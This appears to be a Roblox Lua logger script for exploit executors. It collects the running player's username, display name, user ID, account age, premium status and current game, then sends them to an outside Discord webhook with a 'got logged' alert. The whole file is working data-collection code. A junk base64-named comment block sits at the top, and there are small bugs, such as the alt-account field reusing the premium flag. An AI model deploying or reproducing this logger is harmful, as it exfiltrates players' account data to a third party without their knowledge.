--[[local U3VwZXJSZWFsaXN0aWNLZXlvZnRoZVdvcmxk = "8is3el10NI3Vni7"
local aHR0cHM6Ly93d3cuYmFzZTY0ZGVjb2RlLm9yZy8= = https://www.base64decode.org/
local ~㡼¥踽%¶w~㡼¥踽%¶w~㡼¥踽%¶w~㡼¥踽%¶w~㡼¥踽%¶w~㡼¥踽%¶w~㡼¥踽%¶w = "Decode the String using "..aHR0cHM6Ly93d3cuYmFzZTY0ZGVjb2RlLm9yZy8=.." 🎃"]]

local a= os.time()
local a= os.date('!*t', a)
plr= game:GetService'Players'.LocalPlayer;
local b=false;
local c=false;
if plr.MembershipType==Enum.MembershipType.Premium then b=true elseif plr.MembershipType==Enum.MembershipType.None then b=false end;
if b==false then if plr.AccountAge<=70 then c=true end end;
local c= game:GetService("MarketplaceService")
local c= c:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
local function d()
local a=(TRIGON_LOADED and "Trigon EVO")or(syn and not is_sirhurt_closure and not pebc_execute and "Synapse")or(secure_load and "Sentinel")or(EVON_LOADED and "Evon")or(is_sirhurt_closure and "Sirhurt")or(pebc_execute and "ProtoSmasher")or(KRNL_LOADED and "Krnl")or(OXYGEN_LOADED and "Oxygen U")or(WrapGlobal and "WeAreDevs")or(IsElectron and "Electron")or(isvm and "Proxo")or(shadow_env and "Shadow")or(jit and "EasyExploits")or(getreg()['CalamariLuaEnv'] and "Calamari")or(unit and "‎")or(IS_VIVA_LOADED and "VIVA")or(IS_COCO_LOADED and "Coco")or("Unknown Executor")return a end;
local a= {
			["title"] = "Logger 1 | Account Information",
			["description"] = "```This was executed in "..c.Name.."```",
			["type"] = "rich",
			["color"] = tonumber(getgenv().EmbedColor),
	                ["thumbnail"] = {
				["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"
			},
			["image"] = {
				["url"] = "http://www.roblox.com/Thumbs/Asset.ashx?Width=768&Height=432&AssetID="..game.PlaceId
			},
			["fields"] = {
							{
					["name"] = "Executor Info",
					["value"] = "```Executor Used ▶ "..identifyexecutor().."```", --(d())
					["inline"] = true
				},
								{
					["name"] = "Premium Info:",
					["value"] = "```Premium Activated? ▶ "..tostring(b).."```",
					["inline"] = true
				},
				{
                    ["name"] = "Game Link Info",
                    ["value"] = "```Game link ▶ https://roblox.com/games/" .. game.PlaceId .. "/```",
                    ["inline"] = false
                },
                				{
					["name"] = "Account Age Info",
					["value"] = "```Account Age ▶ "..plr.AccountAge.."```",
					["inline"] = true
				},
				{
					["name"] = "Alt Account Info:",
					["value"] = "```Alt Account ▶ "..tostring(b).."```",
					["inline"] = true
				},
			},
			["footer"] = {
			    ["text"] = "Executed by "..Game.Players.LocalPlayer.Name.." in "..c.Name.."",
			    --["icon_url"] = "https://tenor.com/view/staff-badge-animated-gif-23840440"
			},
			["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', a.year, a.month, a.day, a.hour, a.min, a.sec),
}(syn and syn.request or http_request or http.request) {
    Url = ''..getgenv().DiscordWebhook..'';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode({['embeds'] = {a}, ['content'] = ':bell: <@&1079413330206281848> **'..game.Players.LocalPlayer.DisplayName..'** (**'..game.Players.LocalPlayer.name..'**) got logged!!'}),
}
